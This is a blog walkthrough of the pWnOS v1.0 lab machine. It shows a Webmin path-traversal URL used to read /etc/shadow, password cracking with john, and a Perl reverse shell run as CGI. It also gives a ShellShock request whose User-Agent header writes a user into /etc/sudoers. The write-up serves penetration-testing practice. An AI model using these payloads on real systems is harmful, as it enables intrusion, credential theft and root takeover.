<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>20240818 pWnOS v1.0 | EZTSEC</title><meta name="author" content="Ethan"><meta name="copyright" content="Ethan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="This target machine is of low difficulty, but attention to detail is required. First, the nmap vulnerability scanning scripts are useful and should not be overlooked. Next, focus on the fact that Webm">
<meta property="og:type" content="article">
<meta property="og:title" content="20240818 pWnOS v1.0">
<meta property="og:url" content="http://eztsec.xyz/2024/08/26/20240818-pWnOS-v1-0/index.html">
<meta property="og:site_name" content="EZTSEC">
<meta property="og:description" content="This target machine is of low difficulty, but attention to detail is required. First, the nmap vulnerability scanning scripts are useful and should not be overlooked. Next, focus on the fact that Webm">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://eztsec.xyz/img/14.jpg">
<meta property="article:published_time" content="2024-08-26T04:31:06.000Z">
<meta property="article:modified_time" content="2024-08-26T09:15:43.032Z">
<meta property="article:author" content="Ethan">
<meta property="article:tag" content="ShellShock">
<meta property="article:tag" content="webmin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://eztsec.xyz/img/14.jpg"><link rel="shortcut icon" href="/img/749ffac0c6014f168ef4f265323b4512!400x400.jpeg"><link rel="canonical" href="http://eztsec.xyz/2024/08/26/20240818-pWnOS-v1-0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b144796d7a023ff659b245c79a1bfef9";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '20240818 pWnOS v1.0',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-26 17:15:43'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/w700d1q75cms.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">18</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/14.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="EZTSEC"><span class="site-name">EZTSEC</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">20240818 pWnOS v1.0</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-26T04:31:06.000Z" title="Created 2024-08-26 12:31:06">2024-08-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-08-26T09:15:43.032Z" title="Updated 2024-08-26 17:15:43">2024-08-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Target-Range/">Target Range</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Techniques/">Techniques</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Target-Range/Intermediate-Level-Target-Range/">Intermediate Level Target Range</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/">privilege escalation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/privilege-escalation/Elevating-Privileges-with-Third-Party-Exploitation-Tools/">Elevating Privileges with Third-Party Exploitation Tools</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Techniques/ShellShock/">ShellShock</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">609</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>3mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="20240818 pWnOS v1.0"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>This target machine is of low difficulty, but attention to detail is required. First, the nmap vulnerability scanning scripts are useful and should not be overlooked. Next, focus on the fact that Webmin is running a CGI service, which indicates potential exploitation via CGI. Additionally, information disclosure vulnerabilities should not be ignored, as even simple information leaks can lead to a successful shell.</p>
<h1 id="20240818-pWnOS-v1-0"><a href="#20240818-pWnOS-v1-0" class="headerlink" title="20240818 pWnOS_v1.0"></a>20240818 pWnOS_v1.0</h1><h2 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h2><p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240818224903-l10m11f.png" alt="image">​</p>
<h2 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h2><p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240818225011-vin2nqg.png" alt="image">​</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240818235930-577bwkj.png" alt="image">​</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240818235955-pcn9g4a.png" alt="image">​</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819000031-rft7jxm.png" alt="image">​</p>
<h2 id="Vulnerability-Discovery"><a href="#Vulnerability-Discovery" class="headerlink" title="Vulnerability Discovery"></a>Vulnerability Discovery</h2><p>Arbitrary file disclosure exists in Webmin.</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819000337-twaee8k.png" alt="image">​</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>View the vulnerability library source code and construct an access link.</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819000424-ba3nz9l.png" alt="image">​</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.119.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819000524-2sswgw8.png" alt="image">​</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819001844-b6xnrgi.png" alt="image">​</p>
<p>Crack the password in the shadow file.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt   </span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819001759-lwbpfgg.png" alt="image">​</p>
<p>SSH login using vmware&#x2F;h4ckm3.</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819002414-lit32xm.png" alt="image">​</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h3><p>Accessing the &#x2F;etc&#x2F;shadow file via Webmin indicates that Webmin is running as root. Since Webmin is a CGI script service, you can upload a Perl reverse shell (&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;perl&#x2F;perl-reverse-shell.pl), change the file extension from .pl to .cgi, grant execute permission (chmod +x), and access the reverse shell through a browser to execute it. This allows obtaining a root shell.</p>
<p>For more on CGI exploitation, refer to:<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi</a></p>
<p>Upload the Perl reverse-shell to the target machine.</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819015137-4itpcce.png" alt="image">​</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819015155-fc4h4yy.png" alt="image">​</p>
<p>Modify the file with the IP + port, and grant execution permission.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x shell.cgi</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819015416-gpbdmac.png" alt="image">​</p>
<p>Directly use curl to access the file disclosure path, making the CGI script execute successfully and return a shell.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//192.168.119.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/tmp/shell.cgi</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819015628-4p2qhlw.png" alt="image">​</p>
<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819015646-abxf4pz.png" alt="image">​</p>
<h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h3><p>Since Webmin is a CGI service, it may also be vulnerable to the ShellShock vulnerability.</p>
<p>ShellShock is a vulnerability that affects the widely used Bash command-line shell in Unix-based operating systems. It targets the ability of Bash to run applications that pass commands. The vulnerability lies in the manipulation of environment variables, which are dynamic named values that affect the operation of processes on a computer. Attackers can exploit this by appending malicious code to environment variables, which is executed when the variable is received. This allows attackers to potentially compromise the system.</p>
<p>Steps to Determine ShellShock Vulnerability:</p>
<h4 id="1-Check-the-Bash-version"><a href="#1-Check-the-Bash-version" class="headerlink" title="1.Check the Bash version."></a>1.Check the Bash version.</h4><p>If the Bash version is below 4.3, there might be a vulnerability.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash --version</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819021743-nfj9jur.png" alt="image">​</p>
<h4 id="2-Use-common-diagnostic-statements"><a href="#2-Use-common-diagnostic-statements" class="headerlink" title="2.Use common diagnostic statements."></a>2.Use common diagnostic statements.</h4><p>If it shows “CVE-2014-6271 vulnerable”, then the vulnerability exists.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env X=<span class="string">&#x27;() &#123; :; &#125;; echo &quot;CVE-2014-6271 vulnerable&quot;&#x27;</span> bash -c date</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819022021-ciytvpq.png" alt="image">​</p>
<h4 id="3-Exploit-the-vulnerability"><a href="#3-Exploit-the-vulnerability" class="headerlink" title="3.Exploit the vulnerability."></a>3.Exploit the vulnerability.</h4><p>Create a bash script named hello.cgi on the target machine and give it execution permissions.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-type: text/HMTL\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;HTML&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;HEllo World!&lt;/title&gt;&lt;/head&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;BODY&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;h2&gt;Hello World!&lt;/h2&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819024228-sx7ktax.png" alt="image">​</p>
<h4 id="4-Construct-the-proof-of-concept-POC"><a href="#4-Construct-the-proof-of-concept-POC" class="headerlink" title="4.Construct the proof of concept (POC)."></a>4.Construct the proof of concept (POC).</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问 http://192.168.119.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi</span><br><span class="line"></span><br><span class="line">GET /unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/hello.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.119.141:10000</span><br><span class="line">User-Agent: () &#123; :; &#125;;/bin/echo &quot;vmware ALL=(ALL) ALL&quot;&gt;&gt;/etc/sudoers</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819025813-pxowc9c.png" alt="image">​</p>
<h4 id="5-Successfully-escalate-privileges"><a href="#5-Successfully-escalate-privileges" class="headerlink" title="5.Successfully escalate privileges."></a>5.Successfully escalate privileges.</h4><p>​<img src="/2024/08/26/20240818-pWnOS-v1-0/image-20240819025927-ej9py1x.png" alt="image">​</p>
<p>‍</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ShellShock/">ShellShock</a><a class="post-meta__tags" href="/tags/webmin/">webmin</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/26/20240820-holynix/" title="20240820 holynix"><img class="cover" src="/img/15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">20240820 holynix</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/26/20240815-pWnOS-v2-0/" title="20240815 pWnOS v2.0"><img class="cover" src="/img/13.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">20240815 pWnOS v2.0</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/07/14/20240714-SickOs1-1/" title="20240714 SickOs1.1"><img class="cover" src="/img/8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-14</div><div class="title">20240714 SickOs1.1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/w700d1q75cms.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ethan</div><div class="author-info__description">Share my experience with shooting machines, urge myself to learn, and update regularly</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">18</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#20240818-pWnOS-v1-0"><span class="toc-number">1.</span> <span class="toc-text">20240818 pWnOS_v1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Discovery"><span class="toc-number">1.1.</span> <span class="toc-text">Host Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.</span> <span class="toc-text">Port Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">Vulnerability Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">Method 1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2"><span class="toc-number">1.5.2.</span> <span class="toc-text">Method 2:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Check-the-Bash-version"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">1.Check the Bash version.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Use-common-diagnostic-statements"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">2.Use common diagnostic statements.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Exploit-the-vulnerability"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">3.Exploit the vulnerability.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Construct-the-proof-of-concept-POC"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">4.Construct the proof of concept (POC).</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Successfully-escalate-privileges"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">5.Successfully escalate privileges.</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/20240824-Hackademic%C2%B7RTB1/" title="20240824 Hackademic·RTB1"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240824 Hackademic·RTB1"/></a><div class="content"><a class="title" href="/2024/08/26/20240824-Hackademic%C2%B7RTB1/" title="20240824 Hackademic·RTB1">20240824 Hackademic·RTB1</a><time datetime="2024-08-26T04:32:40.000Z" title="Created 2024-08-26 12:32:40">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/20240820-holynix/" title="20240820 holynix"><img src="/img/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240820 holynix"/></a><div class="content"><a class="title" href="/2024/08/26/20240820-holynix/" title="20240820 holynix">20240820 holynix</a><time datetime="2024-08-26T04:31:59.000Z" title="Created 2024-08-26 12:31:59">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/20240818-pWnOS-v1-0/" title="20240818 pWnOS v1.0"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240818 pWnOS v1.0"/></a><div class="content"><a class="title" href="/2024/08/26/20240818-pWnOS-v1-0/" title="20240818 pWnOS v1.0">20240818 pWnOS v1.0</a><time datetime="2024-08-26T04:31:06.000Z" title="Created 2024-08-26 12:31:06">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/20240815-pWnOS-v2-0/" title="20240815 pWnOS v2.0"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240815 pWnOS v2.0"/></a><div class="content"><a class="title" href="/2024/08/26/20240815-pWnOS-v2-0/" title="20240815 pWnOS v2.0">20240815 pWnOS v2.0</a><time datetime="2024-08-26T03:22:43.000Z" title="Created 2024-08-26 11:22:43">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7"><img src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="20240808 ctf7"/></a><div class="content"><a class="title" href="/2024/08/09/20240808-ctf7/" title="20240808 ctf7">20240808 ctf7</a><time datetime="2024-08-09T03:28:53.000Z" title="Created 2024-08-09 11:28:53">2024-08-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/14.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Ethan</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>